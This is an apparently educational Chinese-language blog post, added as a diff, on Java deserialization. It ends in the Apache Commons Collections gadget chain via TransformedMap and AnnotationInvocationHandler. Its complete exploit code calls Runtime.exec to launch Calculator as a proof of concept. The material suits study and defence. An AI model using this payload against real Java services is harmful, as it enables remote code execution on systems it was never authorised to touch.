@@ -1,0 +1,583 @@
+#+LATEX_HEADER: \usepackage{fontspec}
+#+LATEX_HEADER: \setmainfont{Songti SC}
+#+STARTUP: indent
+#+STARTUP: hidestars
+#+OPTIONS: ^:nil toc:nil
+#+JEKYLL_CATEGORIES: sec
+#+JEKYLL_TAGS: java sec
+#+JEKYLL_COMMENTS: true
+#+TITLE:java反序列化研究
+** 什么是序列化和反序列化？
+- 序列化
+
+  把对象转换为字节序列的过程称为对象的序列化。
+
+- 反序列化
+
+  把字节序列恢复为对象的过程称为对象的反序列化。
+
+- 隐喻
+
+  通俗的讲，在java代码运行的时候，我们可以看到很多的对象，可以是单一的一个，也可以是一类对象的集合。这些对象中保存着很多数据，把有些信息持久的保存起来，那么这个过程叫做序列化，简而言之就是把内存里面的这些对象给变成一连串的字节描述的过程。
+
+  打个比方，在你搬家的时候。你把衣柜里的所有物品放入德邦快递的编织袋中。到了新家之后，再从编织袋里把所有物品取出来，原样摆放到新家的柜子中。物品放入编织袋这一动作可以看作序列化，把物品从袋子中取出来原样摆放，可以看作反序列化。
+
+- show me the code
+
+  先看一段最基本的代码。
+  #+BEGIN_SRC java
+    package com.cxs.research.serial;
+
+    import java.io.ByteArrayInputStream;
+    import java.io.ByteArrayOutputStream;
+    import java.io.IOException;
+    import java.io.ObjectInputStream;
+    import java.io.ObjectOutputStream;
+    import java.io.Serializable;
+
+    /**
+     ,* Created by chenxuesong on 18/8/20.
+     ,*/
+    public class DemoA implements Serializable {
+
+        private String filedA = "default";
+
+        private void readObject(java.io.ObjectInputStream stream)
+            throws IOException, ClassNotFoundException {
+            System.out.println("DemoA function called in deserialize process.");
+            stream.defaultReadObject();
+        }
+
+        public String getA() {
+            return this.filedA;
+        }
+
+        public static void main(String[] args) throws IOException, ClassNotFoundException {
+            DemoA a = new DemoA();
+            a.filedA = "chenxuesong";
+            byte[] serializeData = serialize(a);
+            DemoA c = (DemoA) deserialize(serializeData);
+            System.out.println(c.getA());
+        }
+
+        public static byte[] serialize(final Object obj) throws IOException {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            ObjectOutputStream objOut = new ObjectOutputStream(out);
+            objOut.writeObject(obj);
+            return out.toByteArray();
+        }
+
+        public static Object deserialize(final byte[] serialized)
+            throws IOException, ClassNotFoundException {
+            ByteArrayInputStream in = new ByteArrayInputStream(serialized);
+            ObjectInputStream objIn = new ObjectInputStream(in);
+            return objIn.readObject();
+        }
+    }
+  #+END_SRC
+  这段代码展示了最简单的序列化和反序列化的场景，生成一个DemoA类的对象a，然后修改fieldA属性为“chenxuesong”。serialize函数中通过writeObject函数把对象序列化到ByteArrayOutputStream流中。然后在deserialize中调用readObject从ByteArrayInputStream流中恢复对象。
+
+  执行代码片段，可以得到以下两句输出。
+  #+BEGIN_SRC shell
+    DemoA function called in deserialize process.
+    chenxuesong
+  #+END_SRC
+  readObject函数我们并没有直接调用，但是从执行结果来看。这个函数在反序列化的过程中被间接调用了。具体流程可以不用分析，只需要记住 *如果实现了Serializable的类重写了readObject函数，那么反序列化过程中会调用readObject函数。* 这一结论即可。
+  
+  再来看第二段代码。
+  #+BEGIN_SRC java
+    package com.cxs.research.serial;
+
+    import java.io.ByteArrayInputStream;
+    import java.io.ByteArrayOutputStream;
+    import java.io.IOException;
+    import java.io.ObjectInputStream;
+    import java.io.ObjectOutputStream;
+    import java.io.Serializable;
+
+    /**
+     ,* Created by chenxuesong on 18/8/20.
+     ,*/
+    public class DemoB implements Serializable {
+
+        private int fieldB;
+        private DemoA a;
+
+        public DemoB() {
+            this.fieldB = 20;
+        }
+
+        private void readObject(java.io.ObjectInputStream stream)
+            throws IOException, ClassNotFoundException {
+            System.out.println("DemoB function called in deserialize process.");
+            stream.defaultReadObject();
+        }
+
+        public static void main(String[] args) throws IOException, ClassNotFoundException {
+            DemoB b = new DemoB();
+            b.a = new DemoA();
+            byte[] serializeData = serialize(b);
+            DemoB c = (DemoB) deserialize(serializeData);
+            System.out.print(c.a.getA());
+        }
+
+        public static byte[] serialize(final Object obj) throws IOException {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            ObjectOutputStream objOut = new ObjectOutputStream(out);
+            objOut.writeObject(obj);
+            return out.toByteArray();
+        }
+
+        public static Object deserialize(final byte[] serialized)
+            throws IOException, ClassNotFoundException {
+            ByteArrayInputStream in = new ByteArrayInputStream(serialized);
+            ObjectInputStream objIn = new ObjectInputStream(in);
+            return objIn.readObject();
+        }
+    }
+  #+END_SRC
+  这一段代码比之前一段更为特殊，DemoB中有一个成员变量的类型是DemoA。直接运行代码，分析输出。在反序列化DemoB的时候，相应的DemoA也被反序列化了。
+  #+BEGIN_SRC shell
+    DemoB function called in deserialize process.
+    DemoA function called in deserialize process.
+    default
+  #+END_SRC
+  因此，我们又可以得到一个结论 *如果成员变量的类也实现了Serializable，会对成员变量进行序列化和反序列化操作* 。
+
+- 结论
+  1. *序列化反序列的本质是对对象的成员变量进行操作*
+
+  2. *如果实现了Serializable的类重写了readObject函数，那么反序列化过程中会调用readObject函数*
+
+  3. *如果成员变量的类也实现了Serializable，会对成员变量进行序列化和反序列化操作*
+** 如何把恶意代码写入数据
+根据 *序列化反序列的本质是对对象的成员变量进行操作* 这一结论。我们可以操控的只有对象的成员变量，并且java语言层次里面只有 *反射* 能够实现数据到任意代码的转换。因此，我们需要找到一些类，它内部包装了 *反射* 功能，另外它还可以被序列化。
+
+在common-collections中， *ChainedTransformer和InvokerTransformer* 刚好符合以上两点。可以用来包装恶意代码。
+
+先看一段java反射代码。执行reflection函数可以直接启动计算器。
+#+BEGIN_SRC java
+    public static void reflection() {
+        try {
+            Class cls = Class.forName("java.lang.Runtime");
+            Method getRuntime = cls.getMethod("getRuntime", new Class[]{});
+            Object runtime = getRuntime.invoke(null);
+            Method exec = cls.getMethod("exec", String.class);
+            exec.invoke(runtime, "/Applications/Calculator.app/Contents/MacOS/Calculator");
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        } catch (NoSuchMethodException e) {
+            e.printStackTrace();
+        } catch (InvocationTargetException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        }
+    }
+#+END_SRC
+
+我们再看看 InvokerTransformer的代码实现。它在构造函数中接收一系列参数，然后在transform函数中触发反射代码执行。
+#+BEGIN_SRC java
+  //
+  // Source code recreated from a .class file by IntelliJ IDEA
+  // (powered by Fernflower decompiler)
+  //
+
+  package org.apache.commons.collections.functors;
+
+  import java.io.Serializable;
+  import java.lang.reflect.InvocationTargetException;
+  import java.lang.reflect.Method;
+  import org.apache.commons.collections.FunctorException;
+  import org.apache.commons.collections.Transformer;
+
+  public class InvokerTransformer implements Transformer, Serializable {
+      static final long serialVersionUID = -8653385846894047688L;
+      private final String iMethodName;
+      private final Class[] iParamTypes;
+      private final Object[] iArgs;
+
+      public static Transformer getInstance(String methodName) {
+          if(methodName == null) {
+              throw new IllegalArgumentException("The method to invoke must not be null");
+          } else {
+              return new InvokerTransformer(methodName);
+          }
+      }
+
+      public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) {
+          if(methodName == null) {
+              throw new IllegalArgumentException("The method to invoke must not be null");
+          } else if((paramTypes != null || args == null) && (paramTypes == null || args != null) && (paramTypes == null || args == null || paramTypes.length == args.length)) {
+              if(paramTypes != null && paramTypes.length != 0) {
+                  paramTypes = (Class[])paramTypes.clone();
+                  args = (Object[])args.clone();
+                  return new InvokerTransformer(methodName, paramTypes, args);
+              } else {
+                  return new InvokerTransformer(methodName);
+              }
+          } else {
+              throw new IllegalArgumentException("The parameter types must match the arguments");
+          }
+      }
+
+      private InvokerTransformer(String methodName) {
+          this.iMethodName = methodName;
+          this.iParamTypes = null;
+          this.iArgs = null;
+      }
+
+      public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+          this.iMethodName = methodName;
+          this.iParamTypes = paramTypes;
+          this.iArgs = args;
+      }
+
+      public Object transform(Object input) {
+          if(input == null) {
+              return null;
+          } else {
+              try {
+                  Class ex = input.getClass();
+                  Method ex1 = ex.getMethod(this.iMethodName, this.iParamTypes);
+                  return ex1.invoke(input, this.iArgs);
+              } catch (NoSuchMethodException var5) {
+                  throw new FunctorException("InvokerTransformer: The method \'" + this.iMethodName + "\' on \'" + input.getClass() + "\' does not exist");
+              } catch (IllegalAccessException var6) {
+                  throw new FunctorException("InvokerTransformer: The method \'" + this.iMethodName + "\' on \'" + input.getClass() + "\' cannot be accessed");
+              } catch (InvocationTargetException var7) {
+                  throw new FunctorException("InvokerTransformer: The method \'" + this.iMethodName + "\' on \'" + input.getClass() + "\' threw an exception", var7);
+              }
+          }
+      }
+  }
+#+END_SRC 
+ChainedTransformer只是包含了一个Transformer数组的类，在它自己的transform函数中依次调用Transformer数组中的每一个元素的transform函数。
+#+BEGIN_SRC java
+  //
+  // Source code recreated from a .class file by IntelliJ IDEA
+  // (powered by Fernflower decompiler)
+  //
+
+  package org.apache.commons.collections.functors;
+
+  import java.io.Serializable;
+  import java.util.Collection;
+  import java.util.Iterator;
+  import org.apache.commons.collections.Transformer;
+  import org.apache.commons.collections.functors.FunctorUtils;
+  import org.apache.commons.collections.functors.NOPTransformer;
+
+  public class ChainedTransformer implements Transformer, Serializable {
+      static final long serialVersionUID = 3514945074733160196L;
+      private final Transformer[] iTransformers;
+
+      public static Transformer getInstance(Transformer[] transformers) {
+          FunctorUtils.validate(transformers);
+          if(transformers.length == 0) {
+              return NOPTransformer.INSTANCE;
+          } else {
+              transformers = FunctorUtils.copy(transformers);
+              return new ChainedTransformer(transformers);
+          }
+      }
+
+      public static Transformer getInstance(Collection transformers) {
+          if(transformers == null) {
+              throw new IllegalArgumentException("Transformer collection must not be null");
+          } else if(transformers.size() == 0) {
+              return NOPTransformer.INSTANCE;
+          } else {
+              Transformer[] cmds = new Transformer[transformers.size()];
+              int i = 0;
+
+              for(Iterator it = transformers.iterator(); it.hasNext(); cmds[i++] = (Transformer)it.next()) {
+                  ;
+              }
+
+              FunctorUtils.validate(cmds);
+              return new ChainedTransformer(cmds);
+          }
+      }
+
+      public static Transformer getInstance(Transformer transformer1, Transformer transformer2) {
+          if(transformer1 != null && transformer2 != null) {
+              Transformer[] transformers = new Transformer[]{transformer1, transformer2};
+              return new ChainedTransformer(transformers);
+          } else {
+              throw new IllegalArgumentException("Transformers must not be null");
+          }
+      }
+
+      public ChainedTransformer(Transformer[] transformers) {
+          this.iTransformers = transformers;
+      }
+
+      public Object transform(Object object) {
+          for(int i = 0; i < this.iTransformers.length; ++i) {
+              object = this.iTransformers[i].transform(object);
+          }
+
+          return object;
+      }
+
+      public Transformer[] getTransformers() {
+          return this.iTransformers;
+      }
+  }
+#+END_SRC
+使用ChainedTransformer和InvokerTransformer本身包含了反射功能，通过输入指定的参数也可以实现和reflection函数一样的功能。需要声明一点的是ChainedTransformer中的transformers数组，在ChainedTransformer的transform函数执行过程中，前一个元素执行自身的transform函数的返回值作为后一个元素的transform函数的参数。具体过程可以自行参考ChainedTransformer的实现逻辑。
+#+BEGIN_SRC java
+  Transformer[] transformers = new Transformer[]{
+      new ConstantTransformer(Runtime.class),
+      new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
+                             new Object[]{"getRuntime", new Class[0]}),
+      new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
+                             new Object[]{null, new Object[0]}),
+      new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
+              "/Applications/Calculator.app/Contents/MacOS/Calculator",}),
+  };
+  Transformer transformerChain = new ChainedTransformer(transformers);
+  transformerChain.transform(null);
+#+END_SRC
+** 初次利用
+上一节主要讲述了如何把我们的恶意代码封装到对象里(找到实现了序列化接口的类)，最终生成了一个链式调用的对象(ChainedTransformer)。仅仅是把封装了恶意代码的对象进行序列化，然后经过传输，最终到目的地进行反序列化。恶意代码并不会触发，因为序列化反序列化的本质是对数据进行打包和重打包。因此我们需要找到一个点，触发我们的反射代码执行。到这一步，结论二 *如果实现了Serializable的类重写了readObject函数，那么反序列化过程中会调用readObject函数* 就派上用场了。它的存在给予了我们在反序列化过程中执行额外代码的机会。
+
+假如一个可以被序列化的对象当中包含了一个ChainedTransformer对象，并且这个对象的类重写了readObject函数，在函数中又恰巧调用了transform函数触发反射代码执行。下面的代码演示了这种理论下完美的情况。但是没有人会在readObject调用transform函数。
+#+BEGIN_SRC java
+  package com.cxs.research.serial;
+
+  import org.apache.commons.collections.Transformer;
+  import org.apache.commons.collections.functors.ChainedTransformer;
+  import org.apache.commons.collections.functors.ConstantTransformer;
+  import org.apache.commons.collections.functors.InvokerTransformer;
+
+  import java.io.ByteArrayInputStream;
+  import java.io.ByteArrayOutputStream;
+  import java.io.IOException;
+  import java.io.ObjectInputStream;
+  import java.io.ObjectOutputStream;
+  import java.io.Serializable;
+  import java.lang.reflect.InvocationTargetException;
+  import java.lang.reflect.Method;
+
+  /**
+   ,* Created by chenxuesong on 18/8/22.
+   ,*/
+  public class DemoC implements Serializable{
+      private Transformer chain;
+
+      public void setChain(Transformer chain) {
+          this.chain = chain;
+      }
+
+      private void readObject(java.io.ObjectInputStream stream)
+          throws IOException, ClassNotFoundException {
+          System.out.println("DemoC function called in deserialize process.");
+          stream.defaultReadObject();
+          // 额外操作，触发反射调用链执行
+          chain.transform(null);
+      }
+
+      public static void main(String[] args) throws IOException, ClassNotFoundException {
+          Transformer[] transformers = new Transformer[]{
+              new ConstantTransformer(Runtime.class),
+              new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
+                                     new Object[]{"getRuntime", new Class[0]}),
+              new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
+                                     new Object[]{null, new Object[0]}),
+              new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
+                      "/Applications/Calculator.app/Contents/MacOS/Calculator",}),
+          };
+          Transformer transformerChain = new ChainedTransformer(transformers);
+          DemoC c = new DemoC();
+          c.setChain(transformerChain);
+          // 模拟序列化和反序列化
+          byte[] out = serialize(c);
+          DemoC c_deserialize = (DemoC) deserialize(out);
+      }
+
+      public static byte[] serialize(final Object obj) throws IOException {
+          ByteArrayOutputStream out = new ByteArrayOutputStream();
+          ObjectOutputStream objOut = new ObjectOutputStream(out);
+          objOut.writeObject(obj);
+          return out.toByteArray();
+      }
+
+      public static Object deserialize(final byte[] serialized)
+          throws IOException, ClassNotFoundException {
+          ByteArrayInputStream in = new ByteArrayInputStream(serialized);
+          ObjectInputStream objIn = new ObjectInputStream(in);
+          return objIn.readObject();
+      }
+
+  }
+#+END_SRC
+** 最终实现
+既然不存在在readObject中直接调用transform函数执行反射链的情况。那么搜索所有调用transform函数的地方，寻找一个可以利用的点。
+
+TransformedMap中的checkSetValue就是这样一个完美的触发点。当parent为TransformedMap的对象时。执行MapEntry中的setValue就会触发transform的执行。我们只需要提前构建好valueTransformer这个反射调用链即可。TransformedMap继承了抽象类AbstractMapEntryDecorator。这里不再复述，可以直接跟踪源码进行分析。
+#+BEGIN_SRC java
+  // TransformedMap.java
+  protected Object checkSetValue(Object value) {
+      return valueTransformer.transform(value);
+  }
+
+  // AbstractInputCheckedMapDecorator.java
+  static class MapEntry extends AbstractMapEntryDecorator {
+
+      /** The parent map */
+      private final AbstractInputCheckedMapDecorator parent;
+
+      protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
+          super(entry);
+          this.parent = parent;
+      }
+
+      public Object setValue(Object value) {
+          value = parent.checkSetValue(value);
+          return entry.setValue(value);
+      }
+  }
+#+END_SRC
+通过调用setValue，间接执行transform函数。同样也可以启动计算器。
+#+BEGIN_SRC java
+  package com.cxs.research.serial;
+
+  import org.apache.commons.collections.Transformer;
+  import org.apache.commons.collections.functors.ChainedTransformer;
+  import org.apache.commons.collections.functors.ConstantTransformer;
+  import org.apache.commons.collections.functors.InvokerTransformer;
+  import org.apache.commons.collections.map.TransformedMap;
+
+  import java.io.IOException;
+  import java.util.HashMap;
+  import java.util.Map;
+
+  /**
+   ,* Created by chenxuesong on 18/8/23.
+   ,*/
+  public class DemoD {
+
+      public static void main(String[] args) throws IOException, ClassNotFoundException {
+          Transformer[] transformers = new Transformer[]{
+              new ConstantTransformer(Runtime.class),
+              new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
+                                     new Object[]{"getRuntime", new Class[0]}),
+              new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
+                                     new Object[]{null, new Object[0]}),
+              new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
+                      "/Applications/Calculator.app/Contents/MacOS/Calculator",}),
+          };
+          Map map = new HashMap();
+          map.put("key", "value");
+          Transformer transformerChain = new ChainedTransformer(transformers);
+          Map<String, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);
+          for (Map.Entry<String, Object> entry : transformedMap.entrySet()) {
+              System.out.print(entry.getKey());
+              entry.setValue("anything");
+          }
+      }
+  }
+#+END_SRC
+现在我们知道了执行TransformedMap中MapEntry对象的setValue即可触发恶意代码。接下来只要在反序列化过程中想办法执行setValue函数就能达到我们的目的。另外我们没有直接写代码的机会，所以找找那些重写readObject函数的类，其中只要调用setValue即可。
+
+恰巧AnnotationInvocationHandler中的readObject会调用setValue函数。
+#+BEGIN_SRC java
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+        var1.defaultReadObject();
+        AnnotationType var2 = null;
+
+        try {
+            var2 = AnnotationType.getInstance(this.type);
+        } catch (IllegalArgumentException var9) {
+            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
+        }
+
+        Map var3 = var2.memberTypes();
+        Iterator var4 = this.memberValues.entrySet().iterator();
+
+        while(var4.hasNext()) {
+            Entry var5 = (Entry)var4.next();
+            String var6 = (String)var5.getKey();
+            Class var7 = (Class)var3.get(var6);
+            if(var7 != null) {
+                Object var8 = var5.getValue();
+                if(!var7.isInstance(var8) || var8 instanceof ExceptionProxy) {
+                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
+                }
+            }
+        }
+
+    }
+#+END_SRC
+
+最终构造的的payload如下。注意要在JDK7u21以下的版本才会生效。
+#+BEGIN_SRC java
+  package com.cxs.research.serial;
+
+  import org.apache.commons.collections.Transformer;
+  import org.apache.commons.collections.functors.ChainedTransformer;
+  import org.apache.commons.collections.functors.ConstantTransformer;
+  import org.apache.commons.collections.functors.InvokerTransformer;
+  import org.apache.commons.collections.map.TransformedMap;
+
+  import java.io.ByteArrayInputStream;
+  import java.io.ByteArrayOutputStream;
+  import java.io.IOException;
+  import java.io.ObjectInputStream;
+  import java.io.ObjectOutputStream;
+  import java.lang.annotation.Retention;
+  import java.lang.reflect.Constructor;
+  import java.lang.reflect.InvocationTargetException;
+  import java.util.HashMap;
+  import java.util.Map;
+
+  /**
+   ,* Created by chenxuesong on 18/8/23.
+   ,*/
+  public class DemoE {
+
+      public static void main(String[] args)
+          throws IOException, ClassNotFoundException, IllegalAccessException,
+                 InvocationTargetException, InstantiationException, NoSuchMethodException {
+          Transformer[] transformers = new Transformer[]{
+              new ConstantTransformer(Runtime.class),
+              new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
+                                     new Object[]{"getRuntime", new Class[0]}),
+              new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
+                                     new Object[]{null, new Object[0]}),
+              new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{
+                      "/Applications/Calculator.app/Contents/MacOS/Calculator",}),
+          };
+          Map map = new HashMap();
+          map.put("test", "value");
+          Transformer transformerChain = new ChainedTransformer(transformers);
+          Map<String, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);
+          Constructor
+              constructor =
+              Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
+              .getDeclaredConstructor(Class.class, Map.class);
+          constructor.setAccessible(true);
+          Object object = constructor.newInstance(Retention.class, transformedMap);
+          byte[] out = serialize(object);
+          Object object_deserialize = deserialize(out);
+      }
+
+
+      public static byte[] serialize(final Object obj) throws IOException {
+          ByteArrayOutputStream out = new ByteArrayOutputStream();
+          ObjectOutputStream objOut = new ObjectOutputStream(out);
+          objOut.writeObject(obj);
+          return out.toByteArray();
+      }
+
+      public static Object deserialize(final byte[] serialized)
+          throws IOException, ClassNotFoundException {
+          ByteArrayInputStream in = new ByteArrayInputStream(serialized);
+          ObjectInputStream objIn = new ObjectInputStream(in);
+          return objIn.readObject();
+      }
+  }
+#+END_SRC
+
